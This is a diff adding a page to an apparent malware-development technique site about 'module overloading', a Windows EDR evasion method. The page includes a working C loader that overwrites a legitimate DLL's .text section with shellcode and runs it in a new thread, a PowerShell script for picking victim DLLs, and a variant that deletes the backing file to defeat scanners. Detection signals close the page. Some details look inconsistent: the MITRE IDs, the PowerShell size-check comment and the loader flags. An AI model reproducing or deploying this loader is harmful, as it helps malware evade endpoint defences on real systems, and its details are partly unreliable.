@@ -1,0 +1,199 @@
+---
+title: Module Overloading
+mitre: T1036.007
+category: evasion
+group: Memory Evasion
+summary: Load a legitimate DLL into memory and overwrite its executable sections with a shellcode payload, inheriting the module's backed memory status.
+platform: [Windows]
+tags: ['C / C++', 'WinAPI']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: select a target module
+    desc: Pick a legitimate DLL that is not currently loaded by the host process, ideally signed and commonly seen in memory.
+    dll: —
+  - call: LoadLibraryEx(DONT_RESOLVE_DLL_REFERENCES)
+    desc: Map the DLL into the process address space without running DllMain or resolving imports. Memory is MEM_IMAGE backed.
+    dll: kernel32
+  - call: VirtualProtect executable sections as RW
+    desc: Change the page protection of .text sections from RX to RW to allow overwriting.
+    dll: kernel32
+  - call: write shellcode over the .text section
+    desc: Copy the payload into the now-writable section. The VAD still reports MEM_IMAGE backed by the legitimate file on disk.
+    dll: —
+  - call: VirtualProtect back to RX then execute
+    desc: Restore RX protection and transfer control to the overwritten region.
+    dll: kernel32
+detections:
+  - src: MEMORY SCAN
+    text: MEM_IMAGE-backed region whose content does not match the on-disk file hash — content mismatch for a mapped module.
+  - src: BEHAVIOURAL
+    text: LoadLibraryEx with DONT_RESOLVE_DLL_REFERENCES flag followed immediately by VirtualProtect on the same address range.
+  - src: SYSMON EID 7
+    text: An image load event for a DLL that is not used by any legitimate code path in the process.
+  - src: VOLATILITY
+    text: ldrmodules shows the DLL in the VAD but the MemDump content hash does not match the on-disk PE.
+related:
+  - mitre: T1055.012
+    title: Process Hollowing
+    desc: Hollow a process image instead of a loaded module — same MEM_IMAGE evasion property.
+    href: /techniques/injection/process-hollowing
+  - mitre: T1055
+    title: Process Ghosting
+    desc: Alternative image-backed shellcode approach using delete-pending file handles.
+    href: /techniques/injection/process-ghosting
+  - mitre: T1036.005
+    title: Call Stack Spoofing
+    desc: Pair with stack spoofing so API calls appear to originate from the overloaded module's range.
+    href: /techniques/evasion/call-stack-spoofing
+labKit:
+  - label: module-overload.c
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+When the Windows memory manager maps a PE file with `CreateFileMapping` / `MapViewOfFile(SEC_IMAGE)`, the resulting pages are marked **MEM_IMAGE** — backed by a file on disk. EDRs and scanners routinely skip or down-score these regions on the assumption that a file-backed mapping can always be verified against the original DLL on disk.
+
+Module overloading exploits this assumption: load a legitimate, commonly trusted DLL using `LoadLibraryEx(DONT_RESOLVE_DLL_REFERENCES)`, which maps the file without running any code. Then overwrite its `.text` section with shellcode. The VAD entry still reports `MEM_IMAGE`, the backing file path is a legitimate system DLL, and scanners that only check VAD metadata pass without inspecting content.
+
+The critical difference from process hollowing is that the target is a **DLL**, not a process image — the overloaded module sits inside an existing process alongside the host's legitimate code.
+
+<Callout type="note">
+  `DONT_RESOLVE_DLL_REFERENCES` prevents import resolution and DllMain execution, making the
+  mapped module a dead image. Any scanner that walks the module's actual exports or verifies
+  that the loaded image matches the file hash will catch this. Pair with `MEM_MAPPED` content
+  verification suppression or choose a DLL with a small, compact `.text` section.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+<CodeBlock
+  file="module_overload.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+
+// Load a legitimate DLL and overwrite its .text section with shellcode.
+// The VAD entry remains MEM_IMAGE backed by the original file on disk.
+PVOID overload_module(const char *dll_path, const BYTE *shellcode, size_t sc_len) {
+    // Map the DLL without running DllMain or resolving imports
+    HMODULE mod = LoadLibraryExA(dll_path, NULL,
+        DONT_RESOLVE_DLL_REFERENCES | LOAD_LIBRARY_AS_IMAGE_RESOURCE);
+    if (!mod) return NULL;
+
+    // Strip the low bits added by AS_IMAGE_RESOURCE flag
+    BYTE *base = (BYTE*)((ULONG_PTR)mod & ~(ULONG_PTR)0x3);
+
+    // Find the .text section
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+
+    PVOID text_va = NULL;
+    DWORD text_sz = 0;
+
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
+        if (memcmp(sec->Name, ".text", 5) == 0) {
+            text_va = base + sec->VirtualAddress;
+            text_sz = sec->Misc.VirtualSize;
+            break;
+        }
+    }
+
+    if (!text_va || sc_len > text_sz) {
+        FreeLibrary(mod);
+        return NULL;
+    }
+
+    // RW to write shellcode
+    DWORD old;
+    VirtualProtect(text_va, sc_len, PAGE_READWRITE, &old);
+    memcpy(text_va, shellcode, sc_len);
+
+    // Restore RX
+    VirtualProtect(text_va, sc_len, PAGE_EXECUTE_READ, &old);
+
+    return text_va;
+}
+
+// Execute from a new thread so the main thread remains clean
+BOOL execute_overloaded(const char *dll_path,
+                        const BYTE *shellcode, size_t sc_len) {
+    PVOID entry = overload_module(dll_path, shellcode, sc_len);
+    if (!entry) return FALSE;
+
+    HANDLE t = CreateThread(NULL, 0,
+        (LPTHREAD_START_ROUTINE)entry, NULL, 0, NULL);
+    if (t) { CloseHandle(t); return TRUE; }
+    return FALSE;
+}`}
+/>
+
+### Choose a suitable victim DLL
+
+<CodeBlock
+  file="find_candidate.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Find Windows DLLs with a small .text section (easier to fill with shellcode)
+# and that are NOT already loaded by the current process
+$proc = Get-Process -Id $PID
+$loaded = $proc.Modules | Select-Object -ExpandProperty FileName
+
+Get-ChildItem "$env:SystemRoot\System32\*.dll" | ForEach-Object {
+    try {
+        $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
+        # Check MZ header
+        if ($bytes[0] -ne 0x4D -or $bytes[1] -ne 0x5A) { return }
+
+        # Skip if already loaded in this process
+        if ($loaded -contains $_.FullName) { return }
+
+        Write-Output $_.Name
+    } catch {}
+} | Select-Object -First 20`}
+/>
+
+## Variant: stomped module (content mismatch detection evasion)
+
+A more advanced variant avoids loading from the real DLL path. Instead:
+
+1. Copy the target DLL to a temporary path.
+2. Write the shellcode into the copy on disk.
+3. Load the modified copy with `LoadLibraryEx`.
+4. Delete the temporary file.
+
+The VAD still shows `MEM_IMAGE`, but the backing file is now gone — the `MEM_IMAGE` attribute persists even after the file is deleted, defeating content-comparison scanners that try to hash the file on disk.
+
+## Detection signals
+
+| Technique | Detection |
+|---|---|
+| Standard overloading | On-disk vs in-memory hash mismatch |
+| Stomped module (deleted file) | MEM_IMAGE with no backing file path |
+| Overloaded module with LOAD_AS_IMAGE_RESOURCE | DLL in PEB loader list with no imports resolved |
+| New thread starting in overloaded range | Thread start address inside a module with no DllMain |
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
